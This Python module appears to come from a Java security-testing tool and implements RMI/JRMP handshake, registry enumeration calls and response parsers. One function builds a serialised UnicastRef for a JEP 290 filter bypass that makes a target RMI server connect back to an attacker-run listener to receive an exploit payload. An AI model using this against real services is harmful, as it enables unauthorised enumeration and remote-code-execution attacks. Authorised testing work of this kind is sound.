"""Java RMI wire protocol primitives.

Wire format reference: JDK source ``sun/rmi/transport/`` and
``java/rmi/server/ObjID.java`` / ``sun/rmi/server/UnicastRef.java``.

ObjID encoding (22 bytes on the wire, from ObjID.write() + UID.write()):
  - objNum     : long  (8 bytes, big-endian)
  - uid.unique : int   (4 bytes) ← UID.write() uses writeInt(), NOT writeShort()
  - uid.time   : long  (8 bytes)
  - uid.count  : short (2 bytes)

Well-known ObjIDs (all-zero UID):
  - Registry  : objNum = 0
  - Activator : objNum = 1
  - DGC        : objNum = 2

CALL message format (old-style skel dispatch — proven by wire capture against JDK 8):
  0x50                MSG_CALL
  AC ED 00 05         ObjectOutputStream header
  77 22               TC_BLOCKDATA, 34 bytes (ObjID 22 + op 4 + hash 8)
  ObjID (22 bytes)    inside block data
  int32  op           operation index (0=bind,1=list,2=lookup… or 1=dirty for DGC)
  int64  interfaceHash  skel interface hash (NOT method hash)
  [raw argument object bytes]  TC_STRING / TC_OBJECT without OOS header
"""

from __future__ import annotations

import struct
from typing import Any

from javapwner.core.socket_helper import (
    read_java_utf,
    write_java_utf,
)

# ---------------------------------------------------------------------------
# JRMP constants (duplicated here so rmi/ is standalone; jrmp.py is Jini-only)
# ---------------------------------------------------------------------------

JRMP_MAGIC = b"\x4a\x52\x4d\x49"       # "JRMI"
JRMP_VERSION = b"\x00\x02"
STREAM_PROTOCOL = b"\x4b"               # StreamProtocol
PROTOCOL_ACK = 0x4E

MSG_CALL = 0x50
MSG_RETURN = 0x51
MSG_PING = 0x52
MSG_PING_ACK = 0x53
MSG_DGC_ACK = 0x54

# Return type codes embedded inside a RETURN message
RETURN_VALUE = 0x01
RETURN_EXCEPTION = 0x02

# Java serialisation magic (start of ObjectOutputStream)
JAVA_STREAM_MAGIC = b"\xac\xed"
JAVA_STREAM_VERSION = b"\x00\x05"
TC_ENDBLOCKDATA = 0x78
TC_EXCEPTION = 0x73      # first byte of an exception in the return stream


# ---------------------------------------------------------------------------
# ObjID builders
# ---------------------------------------------------------------------------

def _make_objid(obj_num: int) -> bytes:
    """Encode an ObjID with an all-zero UID as 22 wire bytes.

    Wire format (from ObjID.write() + UID.write() in the JDK):
      objNum  : long  (8 bytes, big-endian)
      uid.unique : int   (4 bytes, big-endian) ← NOT short
      uid.time   : long  (8 bytes, big-endian)
      uid.count  : short (2 bytes, big-endian)
    Total: 22 bytes.
    """
    return (
        struct.pack(">q", obj_num)   # objNum: long (8 bytes)
        + struct.pack(">i", 0)       # uid.unique: int (4 bytes)
        + struct.pack(">q", 0)       # uid.time:   long (8 bytes)
        + struct.pack(">h", 0)       # uid.count:  short (2 bytes)
    )


REGISTRY_OBJID = _make_objid(0)
ACTIVATOR_OBJID = _make_objid(1)
DGC_OBJID = _make_objid(2)


# ---------------------------------------------------------------------------
# JRMP handshake
# ---------------------------------------------------------------------------

def build_jrmp_handshake() -> bytes:
    """Return the 7-byte JRMP client handshake."""
    return JRMP_MAGIC + JRMP_VERSION + STREAM_PROTOCOL


def build_client_endpoint() -> bytes:
    """Return the 6-byte client endpoint (step 3 of JRMP StreamProtocol handshake).

    After receiving ProtocolAck the client must send its own endpoint:
      writeUTF("")   → 2-byte length prefix (0x00 0x00) + 0 bytes of string
      writeInt(0)    → 4-byte big-endian zero

    Without this step the server's readUTF() consumes CALL bytes as a string
    length, corrupting all subsequent communication.
    """
    return b"\x00\x00" + b"\x00\x00\x00\x00"


def parse_jrmp_ack(data: bytes) -> dict[str, Any]:
    """Parse a JRMP server ProtocolAck response.

    Returns ``{"ack_byte", "version", "hostname", "port"}``.
    Raises ``ValueError`` if the ack byte is wrong or data is empty.
    """
    if not data:
        raise ValueError("Empty JRMP response")
    ack = data[0]
    if ack != PROTOCOL_ACK:
        raise ValueError(
            f"Expected ProtocolAck (0x{PROTOCOL_ACK:02x}), got 0x{ack:02x}"
        )
    result: dict[str, Any] = {
        "ack_byte": ack,
        "version": None,
        "hostname": None,
        "port": None,
    }
    if len(data) < 3:
        return result
    result["version"] = struct.unpack_from(">H", data, 1)[0]
    if len(data) >= 5:
        try:
            hostname, offset = read_java_utf(data, 3)
            result["hostname"] = hostname
            if offset + 4 <= len(data):
                result["port"] = struct.unpack_from(">I", data, offset)[0]
        except (struct.error, IndexError):
            pass
    return result


# ---------------------------------------------------------------------------
# Registry interface / method hashes
# ---------------------------------------------------------------------------

# From sun/rmi/registry/RegistryImpl_Stub (interface hash for registry v1.2 stub)
REGISTRY_INTERFACE_HASH: int = 4905912898345647071

# Method hashes (from JDK, used with op=-1 in new-style dispatch)
LIST_METHOD_HASH: int = 2571371466621089378
LOOKUP_METHOD_HASH: int = -7538657168040752697
BIND_METHOD_HASH: int = 7583982177005850366
REBIND_METHOD_HASH: int = -8381844669958460146
UNBIND_METHOD_HASH: int = 7305022919901907578


# ---------------------------------------------------------------------------
# CALL builders
# ---------------------------------------------------------------------------

def _make_call(objid: bytes, op: int, intf_hash: int, arg_bytes: bytes = b"") -> bytes:
    """Build a JRMP CALL message (old-style skel dispatch).

    Wire format proven by capturing a real JDK RMI client (Java 8):
      MSG_CALL (1 byte)
      AC ED 00 05          ObjectOutputStream header
      77 22                TC_BLOCKDATA, 34 bytes
      [ObjID 22 bytes]     inside block data
      [op 4 bytes]         inside block data
      [hash 8 bytes]       inside block data
      [arg_bytes]          raw argument content (TC_STRING/TC_OBJECT, no OOS header)
    """
    block_data = objid + struct.pack(">i", op) + struct.pack(">q", intf_hash)
    return (
        bytes([MSG_CALL])
        + JAVA_STREAM_MAGIC + JAVA_STREAM_VERSION   # OOS header
        + bytes([0x77, len(block_data)])             # TC_BLOCKDATA
        + block_data
        + arg_bytes
    )


def build_list_call() -> bytes:
    """Build a Registry list() CALL (no arguments).

    op=1 = list (RegistryImpl_Skel: 0=bind,1=list,2=lookup,3=rebind,4=unbind)
    hash = REGISTRY_INTERFACE_HASH (old-style skel interface hash)
    """
    return _make_call(REGISTRY_OBJID, 1, REGISTRY_INTERFACE_HASH)


def build_lookup_call(name: str) -> bytes:
    """Build a Registry lookup(String) CALL.

    op=2 = lookup; argument is TC_STRING with the bound name.
    """
    arg_bytes = b"\x74" + write_java_utf(name)   # TC_STRING + 2-byte len + UTF-8
    return _make_call(REGISTRY_OBJID, 2, REGISTRY_INTERFACE_HASH, arg_bytes)


def build_unicastref_payload(host: str, port: int, obj_num: int = 0) -> bytes:
    """Build a serialised UnicastRef pointing to *host:port*.

    Used for JEP 290 bypass: embed this as a DGC dirty() argument so
    the target RMI runtime connects back to our JRMP listener, which
    delivers the actual exploit payload outside JEP 290 filter context.

    Returns raw ObjectOutputStream bytes that deserialise to a
    ``sun.rmi.server.UnicastRef`` containing a ``LiveRef`` with the
    specified TCP endpoint.
    """
    # Serialised UnicastRef structure:
    #   ObjectOutputStream header
    #   TC_OBJECT (0x73)
    #     TC_CLASSDESC (0x72)
    #       "java.rmi.server.RemoteObject"
    #     TC_ENDBLOCKDATA
    #   TC_CLASSDESC (0x72)
    #     "sun.rmi.server.UnicastRef"
    #   (custom writeExternal data)
    #     host (UTF string) + port (int32) + ObjID + boolean
    #
    # Simplified: we just produce the minimal serialised stream that
    # the JDK's UnicastRef readExternal() will accept.
    host_bytes = write_java_utf(host)
    endpoint_data = (
        host_bytes
        + struct.pack(">i", port)
        + _make_objid(obj_num)  # ObjID (22 bytes)
        + b"\x00"               # isResultStream = false
    )

    # Minimal serialisation: we embed a raw UnicastRef2 type 1 (TCPEndpoint)
    stream = (
        JAVA_STREAM_MAGIC
        + JAVA_STREAM_VERSION
        + b"\x73"  # TC_OBJECT
        + b"\x72"  # TC_CLASSDESC
        + struct.pack(">H", len("sun.rmi.server.UnicastRef"))
        + b"sun.rmi.server.UnicastRef"
        + b"\x00\x00\x00\x00\x00\x00\x00\x00"  # serialVersionUID placeholder
        + b"\x0c"  # flags = SC_EXTERNALIZABLE | SC_BLOCK_DATA
        + struct.pack(">H", 0)  # field count = 0
        + b"\x78"  # TC_ENDBLOCKDATA (classAnnotation)
        + b"\x70"  # TC_NULL (superClassDesc)
        + b"\x77"  # TC_BLOCKDATA
        + struct.pack(">B", len(endpoint_data))
        + endpoint_data
        + b"\x78"  # TC_ENDBLOCKDATA
    )
    return stream


# ---------------------------------------------------------------------------
# RETURN parser
# ---------------------------------------------------------------------------

def parse_registry_return(data: bytes) -> dict[str, Any]:
    """Parse a JRMP RETURN message from the Registry.

    Returns a dict with ``"names"`` (list[str]) on success, or
    ``"error"`` (str) on failure.
    """
    if not data:
        return {"error": "Empty response"}
    if data[0] != MSG_RETURN:
        return {"error": f"Expected MSG_RETURN (0x51), got 0x{data[0]:02x}"}
    if len(data) < 2:
        return {"error": "RETURN too short"}

    return_type = data[1]
    if return_type == RETURN_EXCEPTION:
        return {"error": "Registry returned an exception"}

    # The actual return value is a serialized ObjectOutputStream.
    # For list(), it is a String[] (TC_ARRAY of TC_STRING).
    # We extract strings heuristically since full deserialization would
    # require a JVM.
    names = _extract_strings_from_return(data[2:])
    return {"names": names}


def _extract_strings_from_return(data: bytes) -> list[str]:
    """Heuristically extract Java writeUTF strings from a serialised stream.

    Handles TC_STRING (0x74) with 2-byte length prefix and
    TC_LONGSTRING (0x7C) with 8-byte length prefix.
    TC_REFERENCE (0x71) back-references are tracked but not resolved.
    """
    names: list[str] = []
    seen: set[str] = set()
    handles: list[str] = []  # TC_REFERENCE handle table
    i = 0
    while i < len(data) - 3:
        if data[i] == 0x74:           # TC_STRING
            length = struct.unpack_from(">H", data, i + 1)[0]
            end = i + 3 + length
            if end <= len(data):
                try:
                    s = data[i + 3:end].decode("utf-8")
                    handles.append(s)
                    if s and s not in seen and len(s) < 512:
                        seen.add(s)
                        names.append(s)
                except UnicodeDecodeError:
                    pass
                i = end
                continue
        elif data[i] == 0x7C:         # TC_LONGSTRING
            if i + 9 > len(data):
                break
            slen = struct.unpack_from(">Q", data, i + 1)[0]
            end = i + 9 + slen
            if slen < 0x10000 and end <= len(data):
                try:
                    s = data[i + 9:end].decode("utf-8")
                    handles.append(s)
                    if s and s not in seen and len(s) < 512:
                        seen.add(s)
                        names.append(s)
                except UnicodeDecodeError:
                    pass
                i = end
                continue
        elif data[i] == 0x71:         # TC_REFERENCE
            if i + 5 <= len(data):
                handle_idx = struct.unpack_from(">I", data, i + 1)[0] - 0x7E0000
                if 0 <= handle_idx < len(handles):
                    s = handles[handle_idx]
                    if s and s not in seen and len(s) < 512:
                        seen.add(s)
                        names.append(s)
                i += 5
                continue
        elif data[i] == 0x75:         # TC_ARRAY
            pass
        i += 1
    return names


# ---------------------------------------------------------------------------
# Lookup RETURN parser
# ---------------------------------------------------------------------------

def parse_lookup_return(data: bytes) -> dict[str, Any]:
    """Parse a JRMP RETURN from Registry.lookup().

    Heuristically extracts:
    - The remote class name from a TC_CLASSDESC (0x72)
    - An embedded TCPEndpoint (host string followed by int32 port)

    Returns ``{"class_name": ..., "endpoint": {"host": ..., "port": ...}}``.
    """
    result: dict[str, Any] = {"class_name": None, "endpoint": None}

    if not data:
        return result

    # Skip MSG_RETURN + return_type if present
    offset = 0
    if data[0] == MSG_RETURN:
        if len(data) < 2:
            return result
        if data[1] == RETURN_EXCEPTION:
            result["error"] = "lookup returned exception"
            return result
        offset = 2

    payload = data[offset:]

    # Extract class name from TC_CLASSDESC (0x72)
    class_name = _extract_class_name(payload)
    if class_name:
        result["class_name"] = class_name

    # Extract TCPEndpoint (host string + int32 port)
    endpoint = _extract_tcp_endpoint(payload)
    if endpoint:
        result["endpoint"] = endpoint

    return result


def _extract_class_name(data: bytes) -> str | None:
    """Find the first TC_CLASSDESC (0x72) and extract the class name."""
    i = 0
    while i < len(data) - 3:
        if data[i] == 0x72:  # TC_CLASSDESC
            if i + 3 > len(data):
                break
            name_len = struct.unpack_from(">H", data, i + 1)[0]
            end = i + 3 + name_len
            if end <= len(data) and name_len < 512:
                try:
                    name = data[i + 3:end].decode("utf-8")
                    # Validate it looks like a Java class name
                    if name and ("." in name or name[0].isupper()):
                        return name
                except UnicodeDecodeError:
                    pass
        i += 1
    return None


def _extract_tcp_endpoint(data: bytes) -> dict[str, Any] | None:
    """Find an embedded TCPEndpoint pattern: TC_STRING host + int32 port."""
    import re
    host_re = re.compile(
        r"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?"
        r"(?:\.(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?))*"
        r"|(?:\d{1,3}\.){3}\d{1,3})$"
    )
    i = 0
    while i < len(data) - 7:
        if data[i] == 0x74:  # TC_STRING
            str_len = struct.unpack_from(">H", data, i + 1)[0]
            str_end = i + 3 + str_len
            if str_end + 4 <= len(data) and str_len < 256:
                try:
                    host = data[i + 3:str_end].decode("utf-8")
                    if host_re.match(host):
                        port = struct.unpack_from(">i", data, str_end)[0]
                        if 1 <= port <= 65535:
                            return {"host": host, "port": port}
                except (UnicodeDecodeError, struct.error):
                    pass
        i += 1
    return None
